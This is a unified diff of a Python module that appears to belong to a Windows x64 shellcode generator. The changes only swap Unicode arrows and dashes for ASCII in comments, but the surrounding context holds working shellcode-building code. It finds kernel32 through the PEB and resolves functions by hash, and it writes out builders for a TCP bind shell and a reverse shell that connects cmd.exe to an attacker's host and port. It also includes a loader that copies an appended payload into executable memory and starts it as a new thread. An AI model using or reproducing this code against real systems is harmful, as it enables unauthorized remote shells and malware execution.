@@ -5,7 +5,7 @@ All assembly targets Microsoft x64 ABI:
   - First four integer args: RCX, RDX, R8, R9
   - 32-byte shadow space required below args before every CALL
   - 16-byte RSP alignment required before every CALL
-  - No pushad/popad — registers saved/restored individually
+  - No pushad/popad - registers saved/restored individually
   - RIP-relative addressing available for position independence
 """
 
@@ -27,7 +27,7 @@ from .snippets import (
 )
 
 
-# ── Static core blocks ─────────────────────────────────────────────────────────
+# -- Static core blocks ---------------------------------------------------------
 
 _PROLOGUE = """\
 start:
@@ -35,14 +35,14 @@ start:
     mov   rbp, rsp                   ; RBP = frame base; slots live at [rbp-N]
     sub   rsp, 0x80                  ; reserve 128 bytes: slots [rbp-0x08..rbp-0x78] + working room"""
 
-# GS:[0x60] → PEB (x64). All structure offsets differ from x86:
-#   PEB  + 0x18  → Ldr  (was 0x0C)
-#   Ldr  + 0x30  → InInitializationOrderModuleList.Flink  (was 0x1C)
-#   flink+ 0x20  → DllBase  (was 0x08; because InInitOrder links sit at
-#                            LDR_DATA_TABLE_ENTRY+0x10, DllBase at +0x30 → delta 0x20)
-#   flink+ 0x50  → BaseDllName.Buffer  (UNICODE_STRING at +0x58, Buffer ptr at +0x08
-#                            within it → 0x58-0x10+0x08 = 0x50 from flink ptr)
-#   kernel32.dll is 12 characters — same length check as x86, still uses CX
+# GS:[0x60] -> PEB (x64). All structure offsets differ from x86:
+#   PEB  + 0x18  -> Ldr  (was 0x0C)
+#   Ldr  + 0x30  -> InInitializationOrderModuleList.Flink  (was 0x1C)
+#   flink+ 0x20  -> DllBase  (was 0x08; because InInitOrder links sit at
+#                            LDR_DATA_TABLE_ENTRY+0x10, DllBase at +0x30 -> delta 0x20)
+#   flink+ 0x50  -> BaseDllName.Buffer  (UNICODE_STRING at +0x58, Buffer ptr at +0x08
+#                            within it -> 0x58-0x10+0x08 = 0x50 from flink ptr)
+#   kernel32.dll is 12 characters - same length check as x86, still uses CX
 _FIND_KERNEL32 = """\
 find_kernel32:
     xor   rcx, rcx                   ; RCX = 0
@@ -56,7 +56,7 @@ next_module:
     cmp   [rdi+12*2], cx             ; modulename[12] == 0? (kernel32.dll = 12 chars)
     jne   next_module                ; keep walking"""
 
-# Call/pop thunk — position-independent way to capture find_function's runtime address.
+# Call/pop thunk - position-independent way to capture find_function's runtime address.
 # Works identically to x86 but uses 64-bit registers.
 # The CALL pushes an 8-byte return address (address of find_function_ret);
 # POP RSI retrieves it.  That address IS find_function, so we save it to
@@ -77,7 +77,7 @@ def _find_function_asm(algo: str, rotation: int) -> str:
     x64 export-name resolver.
 
     Differences from x86 version:
-      - No pushad/popad — R8–R11 (volatile) saved/restored manually
+      - No pushad/popad - R8-R11 (volatile) saved/restored manually
       - Hash to find is passed in RCX (fastcall first arg), not pushed on stack
       - Uses 64-bit registers throughout; RVAs still 32-bit (PE format unchanged)
       - CALL from caller must include 32-byte shadow space (handled by caller)
@@ -88,7 +88,7 @@ def _find_function_asm(algo: str, rotation: int) -> str:
 
     Register contract on return:
       RAX = resolved function VMA  (0 if not found)
-      All non-volatile registers preserved (RBX, RBP, RDI, RSI, R12–R15)
+      All non-volatile registers preserved (RBX, RBP, RDI, RSI, R12-R15)
     """
     if algo == 'ror':
         hash_ops = (
@@ -103,7 +103,7 @@ def _find_function_asm(algo: str, rotation: int) -> str:
 
     return """\
 find_function:
-    ; Save volatile registers we will use (R8–R11 are caller-saved in ABI but
+    ; Save volatile registers we will use (R8-R11 are caller-saved in ABI but
     ; we save them anyway so find_function is safe to call from any context)
     push  rsi
     push  rdi
@@ -111,7 +111,7 @@ find_function:
     push  r9
     sub   rsp, 0x28                  ; shadow space + 16-byte alignment
 
-    ; RCX = target hash (fastcall arg1) — save it before we clobber RCX
+    ; RCX = target hash (fastcall arg1) - save it before we clobber RCX
     mov   r9,  rcx                   ; R9  = target hash (saved copy)
     xor   rax, rax                   ; RAX = 0 (default: not found)
 
@@ -142,14 +142,14 @@ compute_hash_finished:
 find_function_compare:
     cmp   edx, r9d                   ; computed hash vs target hash
     jnz   find_function_loop
-    ; Match — resolve VMA from ordinal
+    ; Match - resolve VMA from ordinal
     mov   edx, [rdi+0x24]           ; AddressOfNameOrdinals RVA
     add   rdx, rbx                   ; VMA
     movzx ecx, word ptr [rdx+rcx*2] ; ordinal for this name index
     mov   edx, [rdi+0x1c]           ; AddressOfFunctions RVA
     add   rdx, rbx                   ; VMA
     mov   eax, [rdx+rcx*4]          ; function RVA
-    add   rax, rbx                   ; function VMA  ← return value
+    add   rax, rbx                   ; function VMA  <- return value
 find_function_finished:
     add   rsp, 0x28                  ; restore shadow space
     pop   r9
@@ -159,7 +159,7 @@ find_function_finished:
     ret"""
 
 
-# ── String builder for x64 stack ───────────────────────────────────────────────
+# -- String builder for x64 stack -----------------------------------------------
 
 def _x64_stack_string(s: str) -> tuple:
     """
@@ -187,11 +187,11 @@ def _x64_stack_string(s: str) -> tuple:
         nulls = [j for j, b in enumerate(chunk) if b == 0]
 
         if not nulls:
-            # No nulls — immediate is safe to use directly
+            # No nulls - immediate is safe to use directly
             lines.append(
                 f'    mov   dword ptr [rsp+{hex(i)}], {hex(val):<10}  ; "{label}"')
         elif val == 0:
-            # All-null chunk — write a zero dword via register
+            # All-null chunk - write a zero dword via register
             lines += [
                 '    xor   eax, eax',
                 f'    mov   dword ptr [rsp+{hex(i)}], eax             ; "{label}"']
@@ -217,13 +217,13 @@ def _x64_stack_string(s: str) -> tuple:
                 f'    mov   dword ptr [rsp+{hex(i)}], eax']
         else:
             lines += [
-                f'    ; WARNING: embedded null in chunk "{label}" — manual fix required',
+                f'    ; WARNING: embedded null in chunk "{label}" - manual fix required',
                 f'    mov   dword ptr [rsp+{hex(i)}], {hex(val):<10}  ; "{label}"']
 
     return '\n'.join(lines), alloc
 
 
-# ── Resolve block builders ─────────────────────────────────────────────────────
+# -- Resolve block builders -----------------------------------------------------
 
 def build_resolve_block(func_names: list, algo: str, rotation: int,
                         slots: SlotAllocator64,
@@ -233,7 +233,7 @@ def build_resolve_block(func_names: list, algo: str, rotation: int,
 
     x64 calling convention:
       - Hash passed in RCX (first fastcall arg)
-      - `mov ecx, hash` zero-extends to RCX — correct because hashes are 32-bit
+      - `mov ecx, hash` zero-extends to RCX - correct because hashes are 32-bit
       - find_function called via [rbp-0x08] (reserved slot)
       - Result (function VMA) returned in RAX
       - Saved as QWORD to the allocated slot
@@ -314,7 +314,7 @@ def build_call_placeholder(func_names: list, slots: SlotAllocator64) -> str:
     )
 
 
-# ── Mode builders ──────────────────────────────────────────────────────────────
+# -- Mode builders --------------------------------------------------------------
 
 def custom_code(func_names: list, algo: str = 'ror', rotation: int = 13):
     """
@@ -343,11 +343,11 @@ def bindshell_code(port: int, algo: str = 'ror', rotation: int = 13):
     Full TCP bind shell on *port*.
 
     Assembly flow:
-      prologue → find_kernel32 → find_function
+      prologue -> find_kernel32 -> find_function
       resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
       load + resolve ws2_32: WSAStartup, WSASocketA, bind, listen, accept
-      WSAStartup → WSASocketA → sockaddr_in → bind → listen → accept
-      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess
+      WSAStartup -> WSASocketA -> sockaddr_in -> bind -> listen -> accept
+      STARTUPINFOA (socket handles) -> cmd.exe -> CreateProcessA -> TerminateProcess
 
     Register conventions maintained across snippets:
       RSI  socket handle (set by snippet_wsa_socket_tcp / accept)
@@ -387,11 +387,11 @@ def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13)
     Full TCP reverse shell connecting to *lhost*:*lport*.
 
     Assembly flow:
-      prologue → find_kernel32 → find_function
+      prologue -> find_kernel32 -> find_function
       resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
       load + resolve ws2_32: WSAStartup, WSASocketA, WSAConnect
-      WSAStartup → WSASocketA → WSAConnect(lhost:lport)
-      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess
+      WSAStartup -> WSASocketA -> WSAConnect(lhost:lport)
+      STARTUPINFOA (socket handles) -> cmd.exe -> CreateProcessA -> TerminateProcess
 
     Register conventions maintained across snippets:
       RSI  socket handle (set by snippet_wsa_socket_tcp)
@@ -424,9 +424,9 @@ def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13)
     return '\n'.join(sections), slots
 
 
-# ── PI loader ──────────────────────────────────────────────────────────────────
+# -- PI loader ------------------------------------------------------------------
 
-# `add rax, imm32` placeholder — LE bytes EF BE F1 7E, no null bytes.
+# `add rax, imm32` placeholder - LE bytes EF BE F1 7E, no null bytes.
 # Forces a stable 6-byte encoding (REX.W 05 + imm32) so the instruction size
 # is the same before and after patching with the real delta.
 _LOADER_DELTA_PLACEHOLDER_64 = 0x7EF1BEEF
@@ -437,7 +437,7 @@ def _build_in_eax(val: int, comment: str = '') -> list:
     Return a list of assembly lines that load *val* (32-bit) into EAX
     without embedding null bytes in any instruction encoding.
 
-    EAX being 32-bit means the upper 32 bits of RAX are zeroed too — safe
+    EAX being 32-bit means the upper 32 bits of RAX are zeroed too - safe
     for use as any DWORD-width argument moved into a 64-bit register afterwards.
     """
     packed = struct.pack('<I', val & 0xFFFFFFFF)
@@ -465,7 +465,7 @@ def _build_in_eax(val: int, comment: str = '') -> list:
         ]
     else:
         lines = [
-            f'    ; WARNING: embedded null in {hex(val)} ({comment}) — may need encoder',
+            f'    ; WARNING: embedded null in {hex(val)} ({comment}) - may need encoder',
             f'    mov   eax, {hex(val)}{c}',
         ]
     return lines
@@ -482,10 +482,10 @@ def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
       1. Walks the PEB (GS:[0x60]) to find kernel32.dll
       2. Resolves VirtualAlloc, RtlMoveMemory, CreateThread, WaitForSingleObject
       3. Locates the appended payload via a call/pop delta (position-independent)
-      4. VirtualAlloc(RWX) → RtlMoveMemory(payload) → CreateThread → WaitForSingleObject
+      4. VirtualAlloc(RWX) -> RtlMoveMemory(payload) -> CreateThread -> WaitForSingleObject
 
     Callee-saved registers R12/R13/R14 are used to preserve the payload pointer,
-    the RWX buffer address, and the thread handle across API calls — no explicit
+    the RWX buffer address, and the thread handle across API calls - no explicit
     push/pop needed since Win64 ABI guarantees callees preserve R12-R15.
 
     The call/pop delta uses the same one-pass assemble-then-patch strategy as
@@ -514,7 +514,7 @@ def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
     ct_asm  = slots.asm_slot('CreateThread')
     wso_asm = slots.asm_slot('WaitForSingleObject')
 
-    # ── payload_size into EAX (null-byte safe), then MOV into target reg ───────
+    # -- payload_size into EAX (null-byte safe), then MOV into target reg -------
     size_into_rdx = '\n'.join(_build_in_eax(payload_size, 'dwSize = payload size') +
                                ['    mov   rdx, rax'])
     size_into_r8  = '\n'.join(_build_in_eax(payload_size, 'Length = payload size') +
@@ -527,22 +527,22 @@ def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
         _find_function_asm(algo, rotation),
         resolve_block,
 
-        # ── call/pop delta — RAX (→ R12) = payload address ───────────────────
+        # -- call/pop delta - RAX (-> R12) = payload address -------------------
         # After `pop rax`, RAX = runtime address of _get_here label (the pop itself).
         # `add rax, DELTA` advances RAX to the first byte of the appended payload.
         # DELTA = loader_size - offset(_get_here).  Patched after assembly.
-        # R12 is callee-saved — survives VirtualAlloc, RtlMoveMemory, CreateThread.
+        # R12 is callee-saved - survives VirtualAlloc, RtlMoveMemory, CreateThread.
         f"""\
 find_payload:
     call  _get_here
 _get_here:
     pop   rax                        ; RAX = runtime addr of this label
-    add   rax, {hex(_LOADER_DELTA_PLACEHOLDER_64)}  ; PATCHED: delta → payload start
+    add   rax, {hex(_LOADER_DELTA_PLACEHOLDER_64)}  ; PATCHED: delta -> payload start
     mov   r12, rax                   ; R12 = payload ptr (callee-saved)""",
 
-        # ── VirtualAlloc(NULL, payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+        # -- VirtualAlloc(NULL, payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
         # 0x3000 built null-safely: xor + byte + shl.
-        # 0x40 via push imm8 / pop r9 (6A 40 / 41 59 — no nulls).
+        # 0x40 via push imm8 / pop r9 (6A 40 / 41 59 - no nulls).
         f"""\
 call_virtualalloc:
     xor   rcx, rcx                   ; lpAddress = NULL
@@ -557,7 +557,7 @@ call_virtualalloc:
     add   rsp, 0x20
     mov   r13, rax                   ; R13 = RWX buffer (callee-saved)""",
 
-        # ── RtlMoveMemory(RWX_buffer, payload_ptr, payload_size)
+        # -- RtlMoveMemory(RWX_buffer, payload_ptr, payload_size)
         f"""\
 call_rtlmovememory:
     mov   rcx, r13                   ; Destination = RWX buffer
@@ -567,7 +567,7 @@ call_rtlmovememory:
     call  qword ptr [{rtl_asm}]      ; RtlMoveMemory
     add   rsp, 0x20""",
 
-        # ── CreateThread(NULL, 0, RWX_buffer, NULL, 0, NULL)
+        # -- CreateThread(NULL, 0, RWX_buffer, NULL, 0, NULL)
         # dwCreationFlags (5th arg) and lpThreadId (6th arg) go at [rsp+0x20/+0x28].
         # sub rsp, 0x30 = shadow (0x20) + two stack slots (0x10).
         f"""\
@@ -584,7 +584,7 @@ call_createthread:
     add   rsp, 0x30
     mov   r14, rax                   ; R14 = thread handle (callee-saved)""",
 
-        # ── WaitForSingleObject(thread_handle, INFINITE)
+        # -- WaitForSingleObject(thread_handle, INFINITE)
         # INFINITE = 0xFFFFFFFF.  `xor edx,edx / dec edx` gives EDX = 0xFFFFFFFF
         # (32-bit wrap), zero-extended to RDX.  No null bytes in either instruction.
         f"""\
@@ -599,12 +599,12 @@ call_waitforsingleobject:
 
     code = '\n'.join(sections)
 
-    # ── Assemble and patch ─────────────────────────────────────────────────────
+    # -- Assemble and patch -----------------------------------------------------
     from .assembler import assemble64 as _asm
     loader_bytes = bytearray(_asm(code)[0])
     loader_size  = len(loader_bytes)
 
-    # `add rax, 0x7EF1BEEF` → REX.W + 05 + LE(placeholder) = 48 05 EF BE F1 7E
+    # `add rax, 0x7EF1BEEF` -> REX.W + 05 + LE(placeholder) = 48 05 EF BE F1 7E
     marker = b'\x48\x05' + struct.pack('<I', _LOADER_DELTA_PLACEHOLDER_64)
     pos    = loader_bytes.find(marker)
     if pos == -1:
@@ -616,7 +616,7 @@ call_waitforsingleobject:
     # `pop rax` (58) is the single byte at pos-1.
     # After pop, RAX = loader_base + (pos - 1).
     # Payload starts at loader_base + loader_size.
-    # → delta = loader_size - (pos - 1) = loader_size - pos + 1
+    # -> delta = loader_size - (pos - 1) = loader_size - pos + 1
     delta = loader_size - pos + 1
     loader_bytes[pos + 2 : pos + 6] = struct.pack('<I', delta)
 
